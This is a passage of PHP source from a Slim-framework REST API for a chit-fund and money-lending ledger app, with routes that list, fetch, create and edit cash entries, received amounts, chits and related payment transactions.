		$outputfields = array("id", "date", "customer", "customername", "haminame", "credit", "credittotal", "debit", "debittotal", "showdaybook", "note", "note1", "forint","collectedby", "paymentmode", "pmid", "creditexp", "crid", "chitfundid", "created", "updated"); //db field name
		$qryfields = array("id", "date", "customer", "customername", "haminame", "credit", "credittotal", "debit", "debittotal", "showdaybook", "note", "note1", "forint","collectedby", "paymentmode", "pmid", "creditexp", "crid", "chitfundid", "created", "updated");

		$drcr = array();
		// echo json_encode($drcrList);
		for ($i = 0; $i < sizeof($drcrList); $i++) {
			$tmp = array();
			for ($j = 0; $j < sizeof($qryfields); $j++) {
				if (isset($drcrList[$i][$outputfields[$j]])) {
					$tmp[$qryfields[$j]] = $drcrList[$i][$outputfields[$j]];
				}
			}
			if (sizeof($tmp)) {
				$tmp["pmtrans"] = array();
				// echo json_encode($tmp)."dshfllhs".$tmp["id"] != "null";
				if ($tmp["paymentmode"] == 50) {
					$getpmdata = array();
					$params = $db->getFunctionParam("pmtrans");
					for ($m = 0; $m < sizeof($params); $m++) {
						if ($params[$m] == "tableid") {
							array_push($getpmdata, $tmp["id"]);
						} else if ($params[$m] == "tablename") {
							array_push($getpmdata, "drcr");
						} else {
							array_push($getpmdata, "");
						}
					}
					$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
				}
				array_push($drcr, $tmp);
			}
		}
		$response["error"] = false;
		$response['status'] = "Success";
		$response["drcr"] = $drcr;
		$response["message"] = "Woot!, successfully retrieved the DrCr entry list";
	} else {
		$response["error"] = false;
		$response['status'] = "error";
		$response["drcr"] = [];
		$response["message"] = "No Cash Entries found";
	}

	echoRespnse(200, $response);

});




$app->get('/drcr/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	if (sizeof($drcrList) > 0) {
		$outputfields = array("id", "date", "customer", "customername", "haminame", "credit", "credittotal", "debit", "debittotal", "showdaybook", "note", "note1", "forint","collectedby", "paymentmode", "pmid", "creditexp", "crid", "chitfundid", "created", "updated"); //db field name
		$qryfields = array("id", "date", "customer", "customername", "haminame", "credit", "credittotal", "debit", "debittotal", "showdaybook", "note", "note1", "forint","collectedby", "paymentmode", "pmid", "creditexp", "crid", "chitfundid", "created", "updated");

		$drcr = array();
		// looping through result and preparing tasks array
		$tmp = array();
		for ($i = 0; $i < sizeOf($drcrList); $i++) {

			for ($j = 0; $j < sizeof($qryfields); $j++) {
				if (isset($drcrList[$i][$outputfields[$j]])) {
					$tmp[$qryfields[$j]] = $drcrList[$i][$outputfields[$j]];
				}
			}
			//	array_push($customer,$tmp);

		}
		if ($tmp["paymentmode"] == 50) {
			$tmp["pmtrans"] = array();
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "tableid") {
					array_push($getpmdata, $tmp["id"]);
				} else if ($params[$m] == "tablename") {
					array_push($getpmdata, "drcr");
				} else {
					array_push($getpmdata, "");
				}
			}
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}

		$response["error"] = false;
		//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
		$response['status'] = "success";
		//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
		$response["drcr"] = $tmp;
		$response["message"] = "Woot!,Successfully retreived the Cash Entry list";

	} else {
		$response["error"] = false;
		$response['status'] = "error";
		$response["message"] = "No Cash Entry found with given ID";
	}

	echoRespnse(200, $response);

});


$app->put('/drcr/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$pmid = "";
	$pmarr = array();
	$datechanged = false;

	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$drcrDetail = call_user_func_array(array($db, 'getdrcr'), $getdata);
	if (sizeOf($drcrDetail) > 0) {
		$delallpmTrans = false;
		if ($drcrDetail[0]["paymentmode"] == 50 && putParam($r, "paymentmode") != 50) {
			$delallpmTrans = true;
		}
		if ($drcrDetail[0]["date"] != putParam($r, "date")) {
			$datechanged = true;
		}

		$params = $db->putFunctionParam("drcr");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i]) || (gettype(putParam($r, $params[$i])) == "string" && putParam($r, $params[$i]) == 0)) {
				// echo $params[$i]; echo putParam($r,$params[$i]);
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");


		$editDetail = call_user_func_array(array($db, 'editdrcr'), $putdata);

		if ($editDetail) { //if error occurs while creating product

			if (putParam($r, "paymentmode") == 50 && putParam($r, "pmtrans")) {
				$pmtrans = putParam($r, "pmtrans");
				if ($datechanged) {
					for ($b = 0; $b < sizeof($pmtrans); $b++) {
						$pmtrans[$b]->date = putParam($r, "date");
					}
				}
				$opParam = "pmtrans";
				$mainId = "tableid";
				$outputfields = array("date", "tablename", "tableid", "paymentmode", "credit", "debit", "created", "updated");
				$getFunction = "getPmTrans";
				$syncdata = $pmtrans;
				$putFunction = "editPmTrans";
				$tablename = "drcr";
				$syncData = updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $id, $tablename, explode(",", $drcrDetail[0]["pmid"]));
				if ($syncData && sizeof($syncData) > 0) {
					$pmid = array();
					for ($i = 0; $i < sizeof($syncData); $i++) {
						$syncData[$i]["date"] = ($datechanged) ? putParam($r, "date") : $drcrDetail[0]["date"];
						$syncData[$i]["tableid"] = $id;
						$syncData[$i]["tablename"] = "drcr";
						$createpmtransstatus = $db->createPmTrans($syncData[$i]);
						array_push($pmid, $createpmtransstatus['id']);
						// echo " 1- ".json_encode($pmid)."new id -->".$createpmtransstatus['id'];
						// array_push($tmp,$syncData[$i]["no"]);
					}

					if ($pmid && sizeof($pmid) > 0) {
						$params = $db->getFunctionParam("drcr");
						$getdata = array();
						for ($i = 0; $i < sizeof($params); $i++) {
							if ($params[$i] == "id") {
								array_push($getdata, $id);
							} else {
								array_push($getdata, "");
							}
						}
						$drcrDetail1 = call_user_func_array(array($db, 'getdrcr'), $getdata);
						// echo " 2- ".json_encode($drcrDetail1[0]["pmid"]);
						if (sizeOf($drcrDetail1) > 0) {
							$params = $db->putFunctionParam("drcr");
							$updateField = array();
							$updateField["id"] = $id;
							$putdata = array();
							array_push($putdata, $updateField);
							for ($i = 0; $i < sizeof($params); $i++) {
								if ($params[$i] == "pmid") {
									// echo "size".strlen($drcrDetail1[0]["pmid"]);
									if (strlen(trim($drcrDetail1[0]["pmid"])) > 0) {
										$tempstr = "";
										$tempstr = strval($drcrDetail1[0]["pmid"]) . ',' . strval(implode(',', $pmid));
										array_push($putdata, $tempstr);
										// echo " 2.1- ".$tempstr;
									} else {
										array_push($putdata, implode(',', $pmid));
										// echo " 2.2- ".implode(',', $pmid);
									}
								} else {
									array_push($putdata, "");
								}
							}
							array_push($putdata, "");
							// echo " 3- ".json_encode($putdata);
							$editDetail = call_user_func_array(array($db, 'editdrcr'), $putdata);

						}
					}

				}
			}

			if ($delallpmTrans) {
				$params = $db->putFunctionParam("pmtrans");
				$updateField = array();
				$updateField["tablename"] = "drcr";
				$updateField["tableid"] = $id;
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					array_push($putdata, "");
				}
				array_push($putdata, "1");

				$editpmtransDetail = call_user_func_array(array($db, 'editPmTrans'), $putdata);

			}
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Cash Entry";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Cash Entry";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Cash Entry found with given ID";
	}
	echoRespnse(200, $response);
});



//end drcr



$app->post('/sowji', function () use ($app) {
	$r = json_decode($app->request->getBody());
	$sowji = array();
	$sowji["date"] = postParams($app->request->post('date'));
	$sowji["chiti"] = postParams($app->request->post('chiti'));
	$sowji["amount"] = postParams($app->request->post('amount'));
	$sowji["note"] = postParams($app->request->post('note'));



	$db = new DbHandler();
	$createsowjistatus = $db->createsowji($sowji);
	if ($createsowjistatus["status"] == FAILED) {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! an error occured while creating sowji entry";
	} else {
		$response["error"] = false;
		$response["status"] = "Success";
		$response["id"] = $createsowjistatus['id'];
		$response["message"] = "Woot! successfully created Sowji entry with id" . $createsowjistatus['id'];
	}
	echoRespnse(200, $response);

});



$app->post('/receivedamount', function () use ($app) {

	$r = json_decode($app->request->getBody());

	$received = array();

	$received["customer"] = postParams($app->request->post('customer'));
	$received["amount"] = postParams($app->request->post('amount'));
	$received["rcvddate"] = postParams($app->request->post('rcvddate'));
	$received["asalu"] = postParams($app->request->post('asalu'));
	$received["asaluid"] = postParams($app->request->post('asaluid'));
	$received["chiti"] = postParams($app->request->post('chiti'));
	$received["paymentmode"] = postParams($app->request->post('paymentmode'));
	$received["pmtrans"] = postParams($app->request->post('pmtrans'));
	$collectionarr = postParams($app->request->post('collectionarr'));
	$received["note"] = postParams($app->request->post('note'));
	$db = new DbHandler();

	if ($collectionarr && sizeof($collectionarr) > 0) {
		for ($i = 0; $i < sizeof($collectionarr); $i++) {
			$received["amount"] = $collectionarr[$i]["colamt"];
			// echo "amt".$received["amount"];
			$createreceivedstatus = $db->createreceived($collectionarr[$i]["colid"], $received);
		}
	} else {
		$createreceivedstatus = $db->createreceived(0, $received);
	}


	if ($createreceivedstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating received";
		$response["err"] = $createreceivedstatus;
	} else {
		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createreceivedstatus['id'];
		$response["message"] = "Woot!,Successfully created Received Entries with id " . $createreceivedstatus['id'];
	}

	echoRespnse(200, $response);

});



$app->get('/sowji', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("sowji");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}

	}

	$sowjiList = call_user_func_array(array($db, 'getsowji'), $getdata);

	$outputfields = array("id", "date", "chiti", "amount", "note", "amounttotal", "created", "updated"); //db field name
	$qryfields = array("id", "date", "chiti", "amount", "note", "amounttotal", "created", "updated");

	$sowji = array();
	for ($i = 0; $i < sizeof($sowjiList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($sowjiList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $sowjiList[$i][$outputfields[$j]];

			}
		}
		array_push($sowji, $tmp);
	}
	$response["error"] = false;
	$response['status'] = "Success";
	$response["sowji"] = $sowji;
	$response["message"] = "Woot!, successfully retrieved the Sowji  list";

	echoRespnse(200, $response);

});




$app->get('/receivedamount', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("receivedamount");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$receivedamountList = call_user_func_array(array($db, 'getreceivedamount'), $getdata);

	$outputfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "asaluchiti", "chiti", "colid", "colamt", "coldate", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby","collectorname", "paymentmode", "paymentmodename", "pmid", "note", "created", "updated");
	$qryfields = array("id", "customer", "amount", "customername", "rcvddate", "asalu", "asaluid", "asaluchiti", "chiti", "colid", "colamt", "coldate", "code", "sowjicomm", "suricomm", "fullandevicomm","collectedby","collectorname", "paymentmode", "paymentmodename", "pmid", "note", "created", "updated");
	$receivedamount = array();
	for ($i = 0; $i < sizeof($receivedamountList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($receivedamountList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $receivedamountList[$i][$outputfields[$j]];
			}
		}

		$tmp["pmtrans"] = array();
		// echo !empty($tmp["paymentmode"]);
		if ($tmp["paymentmode"] == 50 && $tmp["pmid"]) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "id") {
					$temp = array();
					$temp["op"] = "In";
					$temp["value"] = $tmp["pmid"];
					array_push($getpmdata, json_encode($temp));
				} else {
					array_push($getpmdata, "");
				}
			}
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}


		array_push($receivedamount, $tmp);
	}
	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//echo json_encode(call_user_func_array(array($db,'getchiti'), $getdata));
	//	$response['total'] = call_user_func_array(array($db,'getreceivedamount'), $getdata)[0]["count(*)"];
	$response["receivedamount"] = $receivedamount;
	$response["message"] = "Woot!,Successfully retreived the Received Amount list";


	echoRespnse(200, $response);

});


$app->get('/chiti', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("chiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$chitiList = call_user_func_array(array($db, 'getchiti'), $getdata);
	$outputfields = array("id", "id", "customer", "customername", "code", "date", "tYpe", "advintmonths", "iscountable", "amount", "paymentmode", "paymentmodename", "pmid", "pdwtm", "interestrate", "ccomm", "ccommpaymentmode", "ccommpaymentmodename", "suriccomm", "sowji", "suri", "fullandevi", "reverse", "revcash", "status", "note", "irregular", "hami", "haminame", "created", "updated"); //db field name
	$qryfields = array("SNO", "id", "customer", "customername", "code", "date", "tYpe", "advintmonths", "iscountable", "chitiamount", "paymentmode", "paymentmodename", "pmid", "pdwtm", "interestrate", "ccomm", "ccommpaymentmode", "ccommpaymentmodename", "suriccomm", "sowji", "suri", "fullandevi", "reverse", "revcash", "status", "note", "irregular", "hami", "haminame", "created", "updated");
	$chiti = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($chitiList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($chitiList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $chitiList[$i][$outputfields[$j]];
			}
		}
		array_push($chiti, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//echo json_encode(call_user_func_array(array($db,'getchiti'), $getdata));
	//$response['total'] = call_user_func_array(array($db,'getchiti'), $getdata)[0]["count(*)"];
	$response["chiti"] = $chiti;
	$response["message"] = "Woot!,Successfully retreived the chiti list";


	echoRespnse(200, $response);

});

$app->get('/chitfund', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("chitfund");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$chitfundList = call_user_func_array(array($db, 'getchitfund'), $getdata);
	$outputfields = array("id", "customer", "date", "amount", "type", "status", "customername", "created", "updated"); //db field name
	$qryfields = array("id", "customer", "date", "amount", "type", "status", "customername", "Created", "Updated");
	$chitfund = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($chitfundList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($chitfundList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $chitfundList[$i][$outputfields[$j]];
			}
		}
		array_push($chitfund, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//echo json_encode(call_user_func_array(array($db,'getchitfund'), $getdata));
	//$response['total'] = call_user_func_array(array($db,'getchitfund'), $getdata)[0]["count(*)"];
	$response["chitfund"] = $chitfund;
	$response["message"] = "Woot!,Successfully retreived the chitfund list";


	echoRespnse(200, $response);

});

$app->put('/asalu/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$pmid = array();
	$datechanged = false;
	$fullmsg = "Edited asalu of id " . $id . " : ";
	$mainmsg = "Edited asalu ";
	$seperator = "";
	$seperator1 = "";
	$getdata = array();
	$params = $db->getFunctionParam("asalu");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$asaluDetail = call_user_func_array(array($db, 'getasalu'), $getdata);
	// echo json_encode($asaluDetail);
	if (sizeof($asaluDetail) > 0) {
		$fullmsg .= changeDateUserFormat($asaluDetail[0]["date"]) . " : " . $asaluDetail[0]["customername"] . "(" . $asaluDetail[0]["chiti"] . ") - " . $asaluDetail[0]["amount"] . "(" . $asaluDetail[0]["note"] . ")(" . $asaluDetail[0]["paymentmodename"] . ")\n changed data :\n ";
		$mainmsg .= changeDateUserFormat($asaluDetail[0]["date"]) . " : " . $asaluDetail[0]["customername"] . "(" . $asaluDetail[0]["chiti"] . ") - " . $asaluDetail[0]["amount"] . "(" . $asaluDetail[0]["note"] . ")(" . $asaluDetail[0]["paymentmodename"] . ")\n changed data :\n ";
		if ($asaluDetail[0]["date"] != putParam($r, "date")) {
			$fullmsg .= " Date : " . changeDateUserFormat(putParam($r, "date"));
			$mainmsg .= " Date : " . changeDateUserFormat(putParam($r, "date"));
			$seperator = " , ";
		}

		if ($asaluDetail[0]["chiti"] != putParam($r, "chiti")) {
			// $r->{"chiti"} = 
			$params = $db->getFunctionParam("chiti");
			$getdata = array();
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == 'id') {
					array_push($getdata, putParam($r, "chiti"));
				} else {
					array_push($getdata, "");
				}
			}
			$chitilist = call_user_func_array(array($db, 'getchiti'), $getdata);
			if (sizeof($chitilist) > 0) {
				$r->{"customer"} = $chitilist[0]["customer"];
				$r->{"customername"} = $chitilist[0]["customername"];
				$fullmsg .= $seperator . " chiti : " . putParam($r, "chiti");
				$mainmsg .= $seperator . " chiti : " . putParam($r, "chiti");
				$seperator = " , ";
			} else {
				$response["error"] = true;
				$response["status"] = "error";
				$response["message"] = "No Chiti found with the given ID";
				echoRespnse(201, $response);
				return;
			}
		}
		if ($asaluDetail[0]["customer"] != putParam($r, "customer")) {
			$fullmsg .= $seperator . " customer : " . putParam($r, "customername") . "(" . putParam($r, "customer") . ")";
			$mainmsg .= $seperator . " customer : " . putParam($r, "customername");
			$seperator = " , ";
		}
		if ($asaluDetail[0]["amount"] != putParam($r, "amount")) {
			$fullmsg .= $seperator . " amount : " . putParam($r, "amount");
			$mainmsg .= $seperator . " amount : " . putParam($r, "amount");
			$seperator = " , ";
		}
		if ($asaluDetail[0]["note"] != putParam($r, "note")) {
			$fullmsg .= $seperator . " note : " . putParam($r, "note");
			$mainmsg .= $seperator . " note : " . putParam($r, "note");
			$seperator = " , ";
		}


		$params = $db->putFunctionParam("asalu");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");
		// }
		$editDetail = call_user_func_array(array($db, 'editasalu'), $putdata);

		if ($editDetail) {
			$getdata = array();
			$params = $db->getFunctionParam("receivedamount");
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "asaluid") {
					array_push($getdata, $id);
				} else {
					array_push($getdata, "");
				}
			}

			$receivedDetail = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
			$receivedDetail[0]["pmtrans"] = array();
			if ($receivedDetail[0]["paymentmode"] == 50) {
				$getpmdata = array();
				$params = $db->getFunctionParam("pmtrans");
				for ($m = 0; $m < sizeof($params); $m++) {
					if ($params[$m] == "tableid") {
						array_push($getpmdata, $receivedDetail[0]["id"]);
					} else if ($params[$m] == "tablename") {
						array_push($getpmdata, "received");
					} else {
						array_push($getpmdata, "");
					}
				}
				// echo "id".$receivedDetail["id"];
				$receivedDetail[0]["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
			}
			// echo json_encode($receivedDetail);

			$paymentmodeList = $db->getdynamicRecord("select * FROM paymentmodes where deleted = 0", 100);
			if (putParam($r, "paymentmode") == 50 && sizeof(putParam($r, "pmtrans")) > 0) {
				$pmtranstemp = json_decode(json_encode(putParam($r, "pmtrans")), True);

			}
			// echo json_encode($pmtranstemp);
			if ($asaluDetail[0]["paymentmode"] != putParam($r, "paymentmode") || (putParam($r, "paymentmode") == 50 && ismultiChanged($receivedDetail[0]["pmtrans"], $pmtranstemp))) {
				if (putParam($r, "paymentmode") == 50) {
					$mainmsg .= $seperator . " paymentmode : Multi[";
					$fullmsg .= $seperator . " paymentmode : Multi[";
					for ($w = 0; $w < sizeof($pmtranstemp); $w++) {
						// echo "w-".$w;
						$seperator = ($w == 0) ? "" : " , ";
						if (array_key_exists("modename", $pmtranstemp[$w])) {
							$fullmsg .= $seperator . $pmtranstemp[$w]["modename"] . " = " . $pmtranstemp[$w]["credit"];
							$mainmsg .= $seperator . $pmtranstemp[$w]["modename"] . " = " . $pmtranstemp[$w]["credit"];
						} else {
							$fullmsg .= $seperator . getpmname($pmtranstemp[$w]["paymentmode"], $paymentmodeList) . " = " . $pmtranstemp[$w]["credit"];
							$mainmsg .= $seperator . getpmname($pmtranstemp[$w]["paymentmode"], $paymentmodeList) . " = " . $pmtranstemp[$w]["credit"];
						}
					}
					$fullmsg .= "]";
					$mainmsg .= "]";
				} else {
					$fullmsg .= $seperator . " paymentmode : " . getpmname(putParam($r, "paymentmode"), $paymentmodeList);
					$mainmsg .= $seperator . " paymentmode : " . getpmname(putParam($r, "paymentmode"), $paymentmodeList);
				}
			}

			// echo json_encode($receivedDetail);
			$delallpmTrans = false;
			if ($receivedDetail[0]["paymentmode"] == 50 && putParam($r, "paymentmode") != 50) {
				$delallpmTrans = true;
			}
			if ($receivedDetail[0]["date"] != putParam($r, "date")) {
				$datechanged = true;
			}

			if (putParam($r, "paymentmode") == 50 && sizeof(putParam($r, "pmtrans")) > 0) {
				$pmtrans = putParam($r, "pmtrans");
				if ($datechanged) {
					for ($b = 0; $b < sizeof($pmtrans); $b++) {
						$pmtrans[$b]->date = putParam($r, "date");
					}
				}
				$opParam = "pmtrans";
				$mainId = "tableid";
				$outputfields = array("date", "tablename", "tableid", "paymentmode", "credit", "debit", "created", "updated");
				$getFunction = "getPmTrans";
				$syncdata = $pmtrans;
				$putFunction = "editPmTrans";
				$tablename = "received";
				$syncData = updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $receivedDetail[0]["id"], $tablename, explode(",", $receivedDetail[0]["pmid"]));


				if ($syncData && sizeof($syncData) > 0) {
					for ($i = 0; $i < sizeof($syncData); $i++) {
						$syncData[$i]["date"] = ($datechanged) ? putParam($r, "date") : $receivedDetail[0]["date"];
						$syncData[$i]["tableid"] = $receivedDetail[0]["id"];
						$syncData[$i]["tablename"] = "received";
						$createpmtransstatus = $db->createPmTrans($syncData[$i]);
						// array_push($tmp,$syncData[$i]["no"]);
						array_push($pmid, $createpmtransstatus['id']);
					}

					// if($pmid && sizeof($pmid) > 0){
					// 	$params = $db->getFunctionParam("receivedamount");
					// 	$getdata = array();
					// 		for($i=0;$i<sizeof($params);$i++){
					// 			if($params[$i] == "id"){
					// 				array_push($getdata,$receivedDetail[0]["id"]);
					// 			}else{
					// 				array_push($getdata,"");
					// 			}
					// 	}
					// 	$newreceivedDetail = call_user_func_array(array($db,'getreceivedamount'),$getdata);
					// 	// echo " 2- ".json_encode($chitiDetail1[0]["pmid"]);
					// 	if(sizeOf($newreceivedDetail)>0){
					// 		$params = $db->putFunctionParam("received");
					// 		$updateField = array();
					// 		$updateField["id"] = $receivedDetail[0]["id"];
					// 		$putdata=array();
					// 		array_push($putdata,$updateField);
					// 		for($i=0;$i<sizeof($params);$i++){
					// 			if($params[$i] == "pmid" ){
					// 				// echo "size".strlen($newreceivedDetail[0]["pmid"]);
					// 				if(strlen(trim($newreceivedDetail[0]["pmid"])) > 0){
					// 					$tempstr = "";
					// 					$tempstr = strval($newreceivedDetail[0]["pmid"]) . ',' . strval(implode(',', $pmid));
					// 					array_push($putdata,$tempstr);
					// 					// echo " 2.1- ".$tempstr;
					// 				}else{
					// 					array_push($putdata,implode(',', $pmid));
					// 					// echo " 2.2- ".implode(',', $pmid);
					// 				}
					// 			}else{
					// 				array_push($putdata,"");
					// 			}
					// 		}
					// 		array_push($putdata,"");						
					// 		// echo " 3- ".json_encode($putdata);
					// 		$editDetail = call_user_func_array(array($db,'editchiti'), $putdata);

					// 	}
					// }

				}
				// }

				// echo "del ->".$delallpmTrans;
			}

			if ($delallpmTrans) {
				$params = $db->putFunctionParam("pmtrans");
				$updateField = array();
				$updateField["tablename"] = "received";
				$updateField["tableid"] = $receivedDetail[0]["id"];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					array_push($putdata, "");
				}
				array_push($putdata, "1");

				$editpmtransDetail = call_user_func_array(array($db, 'editPmTrans'), $putdata);

			}

			$getdata = array();
			$params = $db->getFunctionParam("asalu");
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "id") {
					array_push($getdata, $id);
				} else {
					array_push($getdata, "");
				}
			}

			$newasaluDetail = call_user_func_array(array($db, 'getasalu'), $getdata);

			$getdata = array();
			$params = $db->getFunctionParam("receivedamount");
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "asaluid") {
					array_push($getdata, $id);
				} else {
					array_push($getdata, "");
				}
			}

			$receivedDetail = call_user_func_array(array($db, 'getreceivedamount'), $getdata);
			// echo json_encode($receivedDetail);
			if (sizeof($receivedDetail) > 0) {
				//"customer","amount","rcvddate","asalu","asaluid","chiti","colid","paymentmode","pmid","note"
				$params = $db->putFunctionParam("received");
				$updateField = array();
				$updateField["asaluid"] = $id;
				$putdata = array();
				array_push($putdata, $updateField);
				// echo putParam($r,"paymentmode");
				for ($i = 0; $i < sizeof($params); $i++) {
					if ($params[$i] == "rcvddate") {
						array_push($putdata, putParam($r, "date"));
					} else if ($params[$i] == "asalu") {
						array_push($putdata, 1);
					} else if ($params[$i] == "asaluid") {
						array_push($putdata, $id);
					} else if ($params[$i] == "colid") {
						array_push($putdata, "0");
					} else if ($params[$i] == "pmid") {
						if ($pmid && sizeof($pmid) > 0) {
							if (strlen(trim($receivedDetail[0]["pmid"])) > 0) {
								$tempstr = "";
								$tempstr = strval($receivedDetail[0]["pmid"]) . ',' . strval(implode(',', $pmid));
								array_push($putdata, $tempstr);
								// echo " 2.1- ".$tempstr;
							} else {
								array_push($putdata, implode(',', $pmid));
								// echo " 2.2- ".implode(',', $pmid);
							}
						} else {
							if (putParam($r, "paymentmode") == 50) {
								array_push($putdata, "");
							} else {
								array_push($putdata, " ");
							}
						}
					} else {
						if (putParam($r, $params[$i]) || putParam($r, $params[$i]) == 0) {
							array_push($putdata, putParam($r, $params[$i]));
						} else {
							array_push($putdata, "");
						}
					}
				}
				array_push($putdata, "");



				// for($i=0;$i<sizeof($params);$i++){
				// 	if($params[$i] == "customer"){
				// 		if($newasaluDetail[0]["customer"] != $receivedDetail[0]["customer"]){
				// 			array_push($putdata,$newasaluDetail[0]["customer"]);
				// 		}else{
				// 			array_push($putdata,"");
				// 		}
				// 	}else if($params[$i] == "amount"){
				// 		if($newasaluDetail[0]["amount"] != $receivedDetail[0]["amount"]){
				// 			array_push($putdata,$newasaluDetail[0]["amount"]);
				// 		}else{
				// 			array_push($putdata,"");
				// 		}
				// 	}else if($params[$i] == "rcvddate"){
				// 		if($newasaluDetail[0]["date"] != $receivedDetail[0]["rcvddate"]){
				// 			array_push($putdata,$newasaluDetail[0]["date"]);
				// 		}else{
				// 			array_push($putdata,"");
				// 		}
				// 	}else if($params[$i] == "chiti"){
				// 		if($newasaluDetail[0]["chiti"] != $receivedDetail[0]["chiti"]){
				// 			array_push($putdata,$newasaluDetail[0]["chiti"]);
				// 		}else{
				// 			array_push($putdata,"");
				// 		}
				// 	}else if($params[$i] == "paymentmode"){
				// 		if(putParam($r,"paymentmode")){
				// 			array_push($putdata,putParam($r,"paymentmode"));
				// 		}else{
				// 			array_push($putdata,"");
				// 		}
				// 	}else if($params[$i] == "pmid"){
				// 		if($pmid && sizeof($pmid) > 0){
